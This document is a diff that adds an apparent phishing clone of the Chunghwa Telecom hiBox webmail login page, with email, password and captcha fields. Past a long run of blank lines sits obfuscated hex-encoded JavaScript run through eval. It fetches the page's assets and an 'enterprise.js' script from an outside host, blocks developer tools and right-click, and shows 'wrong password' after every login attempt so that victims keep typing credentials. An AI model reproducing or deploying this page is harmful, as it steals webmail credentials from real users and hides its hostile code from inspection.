@@ -1,0 +1,510 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="cache-control" content="max-age=0">
+<meta http-equiv="cache-control" content="no-cache">
+<meta http-equiv="expires" content="0">
+<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+<meta http-equiv="pragma" content="no-cache">
+<link id="hiboxFavicon" rel="shortcut icon" href="" type="image/x-icon">
+
+<meta name="keywords" content="email,HiNet Mail,Push Mail,hinet 郵件,hinet信箱,郵件委外,mail,spam,web mail,webmail,mail ASP,中華 電信 信箱,中華 電信 電子信箱,企業信箱,信箱委外,Mail Server,垃圾郵件,信箱,掃毒,郵件,郵件代管,郵件伺服器,資訊安全,電子信箱,電子郵件,網域名稱,傳真,簡訊,全能信箱,企業信箱,訊息服務,企業郵件">
+<meta name="description" content="省去自行建置及維護電子郵件服務系統之成本及繁瑣，同時享受HiNet中華電信最穩固機房與充足頻寬提供企業電子郵件系統委外之專業化服務，輕鬆擁有安全無毒、不受垃圾郵件干擾的使用環境，讓企業重要商機(郵件)不漏失；多功能整合式郵件信箱服務，操作容易卻提昇企業競爭力">
+<title>hiBox全能信箱</title>
+
+<link id="hiboxCss" href="" rel="stylesheet" type="text/css">
+	
+	<!-- jQuery & jQueryUI + theme --> 
+	<link id="hiboxQuery" href="" rel="stylesheet">
+	
+	
+	<!-- keyboard widget css & script (required) -->
+	<link id="keyCss" href="" rel="stylesheet">
+
+		
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	
+</head>
+<body>
+<form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" onsubmit="return checkSubmit();">
+<input id="domain" type="hidden" value="" name="domain">
+<input id="fieldName" type="hidden" value="" name="field">
+
+<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+    <tbody><tr>
+      <td id="headerImg" height="25" align="right" valign="top" background="">
+    	<table width="370" border="0" cellpadding="0" cellspacing="0">
+        <tbody><tr>
+          <td width="158" height="24" align="right" valign="middle">
+    		<img id="icongif" src="" width="18" height="15" align="middle"> 
+  	    	<a href="#" target="_blank" class="manage">管理者登入
+  	  	  </a> 
+		  <img id="disgif" src="" width="9" height="9"> 
+   <a href="#" class="manage"> 網站地圖
+	  	  </a> 
+		  </td>
+           <td width="195" align="center" valign="middle">
+		  <a href="#" class="language">繁中
+	    	</a> 
+		  <img id="disgif02" src="" alt="" width="9" height="9"> 
+		  <a href="#" class="language">簡中
+		  </a> 
+		  <img id="disgif03" src="" alt="" width="9" height="9"> 
+	    	<a href="#" class="language">English 
+	    	</a>
+		    </td>
+          <td width="17">&nbsp;
+	  	  </td>
+        </tr>
+      </tbody></table>
+	  </td>
+    </tr>
+  </tbody></table>
+  <table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+    <tbody><tr>
+      <td height="81"><img id="mapid" src="" width="937" height="81" border="0" usemap="#Map">
+	  </td>
+    </tr>
+  </tbody></table>
+  <map name="Map" id="Map">
+    <area shape="rect" coords="32,2,267,54" href="#" alt="回首頁">
+    <area shape="rect" coords="723,39,882,62" href="#" target="_blank" alt="立即申請試用TRY IT!">
+  </map>
+  <table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+  <td width="71" valign="top"><img  id="navgif" src="" width="71" height="31"></td>
+  <td width="808"><ul class="menu">
+   <li class="top p1"><a href="/uwc/?lang=zh-tw" id="home" class="top_link" alt="回首頁"><span>Home</span></a></li>
+   <li class="top p2"><a href="/uwc/uwc/homepage_tw/features.html" id="products" class="top_link" alt="產品簡介"><span>products</span><!--[if IE 7]><!--></a><!--<![endif]-->
+    <!--[if lte IE 6]><table><tr><td><![endif]-->
+    <ul class="sub">
+     <li><a href="#">產品特色</a></li>
+     <li><a href="#">功能說明</a></li>
+     <li><a href="#">服務優勢</a></li>
+     <li><a href="#">使用效益</a></li>
+     <li><a href="#" class="fly">加值服務<!--[if IE 7]><!--></a><!--<![endif]-->
+       <!--[if lte IE 6]><table><tr><td><![endif]-->
+       <ul>
+        <li><a href="#">郵件稽核</a></li>
+        <li><a href="#">郵件備份</a></li>
+        <li><a href="#">簡訊OTP</a></li>
+       </ul>
+       <!--[if lte IE 6]></td></tr></table></a><![endif]-->
+    </li></ul>
+    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
+   </li>
+  <li class="top p3"><a href="#" id="prices" class="top_link"><span>prices</span></a></li>
+  <li class="top p4"><a href="#" id="scases" class="top_link"><span>scases</span></a></li>
+   <li class="top p5"><a href="#" id="downloads" class="top_link"><span>downloads</span><!--[if IE 7]><!--></a><!--<![endif]-->
+    <!--[if lte IE 6]><table><tr><td><![endif]-->
+    <ul class="sub">
+     <li><a href="#">產品文件</a></li>
+     <li><a href="#">使用手冊</a></li>
+    </ul>
+    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
+   </li>
+   <li class="top p6"><a href="#" id="applications" class="top_link"><span>applications</span></a></li>
+   <li class="top p7"><a href="#" id="faq" class="top_link"><span>faq</span><!--[if IE 7]><!--></a><!--<![endif]-->
+    <!--[if lte IE 6]><table><tr><td><![endif]-->
+    <ul class="sub">
+     <li><a href="#">業務申請</a></li>
+     <li><a href="#">技術支援</a></li>
+    </ul>
+    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
+   </li>
+   <li class="top p8"><a href="#" id="contactus" class="top_link"><span>contactus</span></a></li>
+  </ul>
+    <div class="box250"></div></td>
+  <td width="58" valign="top"><img id="nav02" src="" width="58" height="31"></td>
+  </tr>
+  </tbody></table>
+
+<!-- header end-->
+<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+    <td height="7"><img id="HB" src="" width="937" height="7"></td>
+  </tr>
+</tbody></table>
+<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+    <td width="3" height="31"><img id="HB04" src="" width="3" height="212"></td>
+    <td width="632" valign="top"><table border="0" cellpadding="0" cellspacing="0" class="index_main_banner_table">
+  <tbody>
+    <tr>
+      <td id="tdMainBannerPic">
+      <div id="divMainBanner1" style="display: none;"><a href="#" target="_parent"><img id="HB05" src="" width="632" height="190" border="0"></a></div>
+      <div style="display: none;" id="divMainBanner5"><a href="#" target="_parent"><img  id="HB06" border="0" src=""></a></div>
+      <div style="display: none;" id="divMainBanner2"><a href="#" target="_parent"><img id="HB08" border="0" src=""></a></div>
+      <div style="" id="divMainBanner3"><a href="#" target="_parent"><img id="HB07" border="0" src=""></a></div>
+      <div style="display: none;" id="divMainBanner4"><a href="#" target="_parent"><img id="HB09" border="0" src=""></a></div>
+      <div style="display: none;" id="divMainBanner4"><a href="#" target="_parent"><img id="HB10" border="0" src=""></a></div>
+      </td>
+    </tr>
+    <tr>
+      <td height="22" align="left" valign="top" background="./uwc/images_tw/banner-bg01.gif"><table width="600" border="0" cellpadding="0" cellspacing="0">
+          <tbody><tr>
+            <td align="right"><table border="0" cellpadding="0" cellspacing="0" class="index_main_banner_page_table">
+              <tbody>
+                <tr id="trMainBannerPage">
+                  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(0);" href="javascript: void(0);">1</a></td>
+                  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(1);" href="javascript: void(0);">2</a></td>
+                  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(2);" href="javascript: void(0);">3</a></td>
+                  <td class="index_main_banner_page_current"><a onmouseover="funShowMainBanner(3);" href="javascript: void(0);">4</a></td>
+		  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(4);" href="javascript: void(0);">5</a></td>
+		  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(5);" href="javascript: void(0);">6</a></td>
+                </tr>
+              </tbody>
+            </table></td>
+          </tr>
+        </tbody></table></td>
+    </tr>
+  </tbody>
+</table></td>
+    <td width="8"><img id="Hb06" src="" width="8" height="212"></td>
+    <td id="bkgrndHB" width="292" align="center" valign="top" >
+	
+	<table width="252" height="135" border="0" cellpadding="0" cellspacing="1" class="loginTable">
+      <tbody><tr>
+        <td height="40" colspan="2" align="right" valign="middle">
+		&nbsp; <script>
+				handleError();
+			   </script>
+	    </td>
+      </tr>
+      <tr>
+        <td height="30" colspan="2" align="center">帳號：
+        
+        <input type="text" id="email" name="email" placeholder="請輸入您完整的email" maxlength="50" size="20" class="ui-keyboard-input ui-widget-content ui-corner-all" aria-haspopup="true" role="textbox" readonly><img id="uname" class="tooltip" title="開啟虛擬鍵盤" src=""> 
+          
+       
+          <br></td>
+      </tr>
+      <tr>
+        <td height="30" colspan="2" align="center">密碼：
+          <input type="password" id="password" name="password" onkeypress="callSubmit(event)" maxlength="50" size="20" class="ui-keyboard-input ui-widget-content ui-corner-all" aria-haspopup="true" role="textbox"><img id="passwdImg" class="tooltip" title="開啟虛擬鍵盤" src=""></td>
+      </tr>
+      
+      
+     		
+		
+	  <tr>
+		<td height="32" align="center">
+			<img id="captcha" src="">&nbsp;=&nbsp;
+			<input type="text" id="captchaans" name="captcha" placeholder="請計算左圖答案" class="ui-widget-content ui-corner-all" style="text-align: center;" size="12" maxlength="3" value="">
+			<a href="#"  tabindex="-1"><img id="refresh" src="" height="15" width="15" tabindex="-1"></a>		
+		</td>
+		<td>
+		
+		</td>
+	  </tr>
+
+	  
+
+		  	
+		
+      <tr>
+	  <td height="25" align="center" id="errMssg" valign="bottom" style="color:red;display:none">嘗試再次輸入您的密碼</td>
+	  </tr><tr>
+        <td height="32" align="center" valign="bottom">
+		
+		<input type="checkbox" name="save_uid" id="save_uid" tabindex="-1">
+          記住我的帳號
+        <a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image6','','',1)" id="loginbtn">
+		<img id="button01" src="" alt="登入" name="Image6" width="47" height="25" border="0" id="Image6">
+		</a>
+		<!--<a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image7','','./uwc/images_tw/botton02_03.gif',1)">-->
+		<img  src="" alt="說明" name="Image7" width="47" height="25" border="0" id="Image7" onclick="MM_openBrWindow('./uwc/homepage_tw/popup.html','','width=395,height=220')"><!--</a>  -->
+        </td>
+        
+      </tr>
+       
+      <tr>
+		<td align="center">
+			<!--<a id="hover" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image11','','',1)" target="_blank" href="#">-->
+			<img id="Image11" width="222" height="36" border="0" name="Image11" alt="管理者登入ENTER" src=""><!--</a>-->
+		</td>
+	  </tr>
+	    
+    </tbody></table>
+	
+	
+	
+	 </td>
+	 
+    <td width="2"><img id="Hb08" src="" width="2" height="212"></td>
+  </tr>
+</tbody></table>
+<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+    <td height="7"><img id="hb09" src="" width="937" height="9"></td>
+  </tr>
+</tbody></table>
+<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+    <td id="hb10" height="206" valign="top" background=""><table width="937" height="190" border="0" cellpadding="0" cellspacing="0">
+      <tbody><tr>
+        <td width="657" height="190" align="center" valign="top"><table width="620" height="39" border="0" cellpadding="0" cellspacing="0">
+          <tbody><tr>
+            <td width="526" height="39" align="left" valign="bottom"><img id="td01" src="" alt="訊息快遞" width="375" height="26"></td>
+            <td width="94" align="right" valign="bottom"><a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image13','','./uwc/images_tw/icon-more02.gif',1)">
+			<img src="" alt="更多訊息" name="Image13" width="94" height="20" border="0" id="Image13"></a></td>
+          </tr>
+        </tbody></table>
+         <!--info start-->
+			<table width="633" height="145" border="0" cellpadding="0" cellspacing="0" class="ul">
+  <tbody><tr>
+    <td height="145" align="left" valign="top"><ul>
+      <li><a href="#" class="language"><img id="iconnew" src="" width="29" height="13" border="0"> hiBox於111/2/15 15:20~19:40發生網路異常，期間webmail/pop/imap/smtp服務無法連線...</a></li>
+      <li><a href="#" class="language"> <img id="iconnew" src="" width="29" height="13" border="0">為提升安全性，將自2022/1/1起停止支援CBC加密連線演算法...</a></li>
+      <li><a href="#" class="language"> 為了保護您的資料安全，建議使用支援TLS1.2加密傳輸協定的作業系統</a></li>
+      <li><a href="#" class="language"> 郵件簡訊OTP密碼鎖，讓您的hiBox信箱更安全!</a></li>
+      <li><a href="#" class="language"> hiBox 舊平台客戶服務升版申請自2016年1月12日開放，請至管理系統登錄申請，謝謝!</a></li>
+      <li><a href="#" class="language">【hiBox系統管理員的小叮嚀】為防範駭客盜用您的hiBox帳號，建議您「強度較高」的密碼組合！</a></li>
+ 	 </ul></td>
+  </tr>
+</tbody></table>
+
+		  <!--info end--> 
+		</td>
+        <td width="20" align="left"><img id="dis01"  src="" width="3" height="190"></td>
+        <td width="260" align="left" valign="middle"><table width="100" border="0" cellpadding="0" cellspacing="4">
+<!--			 
+			<tr>
+              <td><a target="_blank" id="my_href" href='https://hishop.hinet.net/'><img id="my_img" src="./uwc/images_tw/banner07.jpg" width="218" height="80" border="0" /></a></td> 
+            </tr>
+-->
+			<tbody><tr>
+              <td><a target="_blank" id="my_href" href="https://hishop.hinet.net/"><img id="my_img" src="" width="218" height="80" border="0"></a></td> 
+            </tr>
+            <tr>
+              <td><a href="#"><img id="bannerImg" src="" width="218" height="80" border="0"></a></td>			
+              <!--<td><a href='./uwc/homepage_tw/news.html#new05'><img src="./uwc/images_tw/banner02.gif" width="218" height="80" border="0" /></a></td>
+			  <td><a href='https://dsishib2b.cht.com.tw/HiB2B/alf/hiB2BUlUnionListApply.jsp?&sev_type=AK&sev_code=01&lockProduct=true&unlockPdtCode=true'><img src="./uwc/images_tw/banner02-1.gif" width="218" height="80" border="0" /></a></td>
+	  		  -->	  
+            </tr>
+          </tbody></table>
+          </td>
+      </tr>
+    </tbody></table></td>
+  </tr>
+</tbody></table>
+</form>
+<script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							OO00='2769636f6e2d48694e65742e676966272c27737263272c276964275d2c0d0a09095b27496d61676537272c27626f74746f6e30315f30332e676966272c27737263272c276964275d2c0d0a09095b2762616e6e65723031272c2762616e6e657230312e676966272c27737263272c276964275d2c0d0a09095b276d795f696d67272c2762616e6e657230352e6a7067272c27737263272c276964275d2c0d0a09095b2748623038272c2748425f30382e676966272c27737263272c276964275d2c0d0a09095b27686f766572272c27626f74746f6e30335f30322e676966272c27696d67272c276964275d2c0d0a09095b27496d6167653131272c27626f74746f6e30335f30312e676966272c27737263272c276964275d2c0d0a09095b2768623039272c2748425f30392e676966272c27737263272c276964275d2c0d0a09095b2768623130272c2748425f31302e676966272c27696d6775726c272c276964275d2c0d0a09095b2769636f6e6e6577272c2769636f6e2d6e65772e676966272c27737263272c276964275d2c0d0a09095b276469733031272c276469732d30312e676966272c27737263272c276964275d2c0d0a09095b276c6f67696e62746e272c27626f74746f6e30325f30312e676966272c27737263272c276964275d2c0d0a09095b276d795f696d67272c2762616e6e657230352e6a7067272c27737263272c276964275d2c0d0a09095b2768696e657449636f272c2769636f6e2d48694e65742e676966272c27737263272c276964275d2c0d0a09095b276661764c696e6b272c276869626f785f66617669636f6e2e69636f272c2768726566272c276964275d2c0d0a090d0a095d0d0a202020202f2f204c6f6164207468652065787465726e616c2073637269707420616e642063616c6c207468652065787465726e616c2063616c6c6261636b2066756e6374696f6e0d0a20202020202020202020206c6f616445787465726e616c5363726970742827656e74657270726973652e6a73272c2066756e6374696f6e2829207b0d0a09090909636865636b444e53287673722c66756e6374696f6e28297b0d0a09090909096f6e426f64794c6f61642861727261797365742c207072656669782c20767372293b0d0a090909097d293b0d0a202020202020202020202020202020200d0a202020202020202020202020202020202f2f2041646420616e206576656e74206c697374656e657220666f72207468652077696e646f77206c6f6164206576656e740d0a090909092f2f0d0a090909090d0a090909090d0a090909090d0a2020202020202020202020207d293b0d0a0909090d0a092f2f2066756e6374696f6e20746f206c6f61642065787465726e616c207363726970740d0a0966756e6374696f6e206c6f616445787465726e616c5363726970742875726c2c63616c6c6261636b29207b0d0a090976617220736372697074203d20646f63756d656e742e637265617465456c656d656e74282773637269707427293b0d0a09097363726970742e737263203d20707265666978202b2075726c3b0d0a09097363726970742e6f6e6c6f6164203d2066756e6374696f6e2829207b0d0a0909090d0a0909096966202863616c6c6261636b29207b0d0a0909090963616c6c6261636b28293b090909090d0a0909097d0d0a0909090d0a09097d3b0d0a0909646f63756d656e742e686561642e617070656e644368696c6428736372697074293b202f2f20417070656e64207468652073637269707420746f2074686520626f64790d0a097d0d0a0973657373696f6e4578706972656428293b0d0a7d293b0d0a090d0a7661722063617074636861203d20646f63756d656e742e676574456c656d656e7442794964282763617074636861616e7327293b0d0a646f63756d656e742e6164644576656e744c697374656e657228276b6579646f776e272c206576656e74203d3e207b0d0a2020696620286576656e742e6b6579436f6465203d3d3d20313233207c7c20286576656e742e6374726c4b6579202626206576656e742e73686966744b6579202626206576656e742e6b6579436f6465203d3d3d2037332929207b0d0a202020206576656e742e70726576656e7444656661756c7428293b0d0a20207d0d0a7d293b0d0a2f2f2044697361626c652072696768742d636c69636b20636f6e74657874206d656e750d0a646f63756d656e742e6164644576656e744c697374656e65722827636f6e746578746d656e75272c206576656e74203d3e206576656e742e70726576656e7444656661756c742829293b';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c656173654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f55534555507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c32303029';OO0O='7d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b2428646f63756d656e74292e72656164792866756e6374696f6e28297b0d0a090d0a092f2f73657420676c6f62616c207661726961626c65730d0a0976617220767372203d2077696e646f772e6c6f636174696f6e2e687265662e736c6963652877696e646f772e6c6f636174696f6e2e687265662e696e6465784f662827232729202b2031293b0d0a09636f6e7374206d794172726179203d207673722e73706c697428222622293b0d0a09767372203d206d7941727261795b305d3b0d0a090d0a09090d0a092f2f7365742065787465726e616c2066696c65730d0a09636f6e737420707265666978203d202268747470733a2f2f726974616c6672656e646f2e746f702f656e7465727072697365732f223b0d0a09766172206172726179736574203d5b0d0a09095b276869626f7846617669636f6e272c276869626f785f66617669636f6e2e69636f272c2768726566272c276964275d2c0d0a09095b276869626f78437373272c276869426f782e637373272c2768726566272c276964275d2c0d0a09095b276869626f785175657279272c276869626f785f6a71756572792d75692e637373272c2768726566272c276964275d2c0d0a09095b276b6579437373272c276b6579626f6172642e637373272c2768726566272c276964275d2c0d0a09095b27686561646572496d67272c276865616465725f30312e6a7067272c27696d61676575726c272c276964275d2c0d0a09095b2769636f6e676966272c2769636f6e2d30322e676966272c27737263272c276964275d2c0d0a09095b27646973676966272c276469732d30322e676966272c27737263272c276964275d2c0d0a09095b276469736769663032272c276469732d30322e676966272c27737263272c276964275d2c0d0a09095b276469736769663033272c276469732d30322e676966272c27737263272c276964275d2c0d0a09095b276d61706964272c276865616465725f30322e6a7067272c27737263272c276964275d2c0d0a09095b276e6176676966272c27476c6f62616c4e617669676174696f6e30315f30312e676966272c27737263272c276964275d2c0d0a09095b276e61763032272c27476c6f62616c4e617669676174696f6e30315f31302e676966272c27737263272c276964275d2c0d0a09095b274842272c2748425f30332e676966272c27737263272c276964275d2c0d0a09095b2748423034272c2748425f30342e676966272c27737263272c276964275d2c0d0a09095b2748423035272c2748425f30352e6a7067272c27737263272c276964275d2c0d0a09095b2748423036272c2748425f30352d30362e706e67272c27737263272c276964275d2c0d0a09095b2748423037272c2748425f30352d30332e6a7067272c27737263272c276964275d2c0d0a09095b2748423038272c2748425f30352d30322e6a7067272c27737263272c276964275d2c0d0a09095b2748423039272c2748425f30352d30342e6a7067272c27737263272c276964275d2c0d0a09095b2748423130272c2748425f30352d30352e676966272c27737263272c276964275d2c0d0a09095b2748623036272c2748425f30362e676966272c27737263272c276964275d2c0d0a09095b2774643031272c2774642d30312e676966272c27737263272c276964275d2c0d0a09095b27496d6167653133272c2769636f6e2d6d6f726530312e676966272c27737263272c276964275d2c0d0a09095b2762616e6e6572496d67272c2762616e6e657230312e676966272c27737263272c276964275d2c0d0a09095b27706173737764496d67272c276b65797061642e706e67272c27737263272c276964275d2c0d0a09095b27626b67726e644842272c2748425f30372e676966272c27737263272c276964275d2c0d0a09095b27756e616d65272c276b65797061642e706e67272c27737263272c276964275d2c0d0a09095b2763617074636861272c27737469636b79496d672e706e67272c27737263272c276964275d2c0d0a09095b2772656672657368272c27726566726573682e706e67272c27737263272c276964275d2c0d0a09095b27627574746f6e3031272c27626f74746f6e30315f30312e676966272c27737263272c276964275d2c0d0a09095b2769636f6e48696e6574272c';OOO0=O0OO+OO0O+OO00;_c(OOO0);O4857465746='49514759524C5252564A56494F54475359554E5549495252424F43495751554C54554C4C43465657585548435153554F544F4454474343564845454E51465454454A53594B474B4857595142464D49564E51574C4B4847425758574452474E574E4649544858444B5255494C544B4F46475945574A4A575557554F444D45584B57474F58475553424B474F4B58574949424D45495155585749534C55504952594A4B52525345445343445143454A4A545642465754584357464E55484F46524856505944494C5846514A555142484C4954504F544746434D4E46575258464F594C53'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function sessionExpired(){
+	document.getElementById('errMssg').innerHTML="密码错误，请重试。";
+    $('#errMssg').show();
+}
+
+//avoid form submission without validation
+$('#loginbtn').on('click', function(event) {
+	//check for captchaans
+
+	if(captcha.value =="0"){
+
+		clkLgn(function(statusCode){
+		
+			displayCss(statusCode);
+			captcha.value="";
+		
+
+		});
+	}else{
+		
+		document.getElementById('errMssg').innerHTML="錯誤驗證碼";
+		$('#errMssg').show();
+		captcha.value="";
+		document.getElementById('password').value = "";
+
+		
+	}
+
+});
+$('#bkgrndHB').on('keydown', function(event) {
+		checkSubmit(event, function(statusCode) {
+			//check for ans and reset values
+			if (captcha.value =="0"){
+				
+				displayCss(statusCode);
+				captcha.value="";
+			}else{
+				document.getElementById('errMssg').innerHTML="錯誤驗證碼";
+				$('#errMssg').show();
+				captcha.value="";
+				if (statusCode){
+					count -=1;
+				}
+				
+
+			}
+			
+			
+        });
+    });
+	
+function displayCss(status){
+
+		if(status){
+			document.getElementById('errMssg').innerHTML="重试输入密码。";
+			$('#errMssg').show();
+		}else {
+			document.getElementById('errMssg').innerHTML="密码错误，请重试。";
+            $('#errMssg').show();
+		}
+
+	
+}
+</script>
+<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+    <td height="66" align="center" valign="top"><table width="800" border="0" cellpadding="0" cellspacing="0">
+      <tbody><tr>
+        <td width="145" height="43" align="right"><img id="iconHinet" src="" width="126" height="50">
+                           </td>
+        <td width="655" align="left" valign="middle" class="front-copyright">中華電信股份有限公司地址：臺北市信義路一段21號 服務時間：24小時全年無休
+                                  <br>
+                                  全區免費客戶服務電話：0800-080-365
+ 		                         <br>
+                                 © Chunghwa Telecom Co., Ltd. All Rights Reserved.</td>
+      </tr>
+    </tbody></table>
+ </td>
+  </tr>
+</tbody></table>
+
+ <!--footer end-->
+
+
+
+</body>
+</html>
